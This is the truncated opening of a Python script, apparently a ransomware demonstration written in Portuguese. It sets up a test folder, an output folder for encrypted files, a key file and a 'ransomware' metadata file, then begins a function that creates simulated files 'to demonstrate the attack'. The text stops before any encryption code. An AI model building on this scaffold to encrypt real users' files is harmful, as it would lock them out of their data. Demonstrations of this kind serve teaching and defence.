import os
import json
from pathlib import Path
from cryptography.fernet import Fernet


# ─── Configuração da pasta de testes ──────────────────────────────────────────
PASTA_TESTE = Path("arquivos_teste")
PASTA_CRIPTOGRAFADA = Path("arquivos_criptografados")
ARQUIVO_CHAVE = "chave_secreta.key"
ARQUIVO_METADADOS = "metadados_ransomware.json"


def criar_arquivos_teste():
    """Cria arquivos simulados para demonstrar o ataque."""
    PASTA_TESTE.mkdir(exist_ok=True)

    arquivos = {
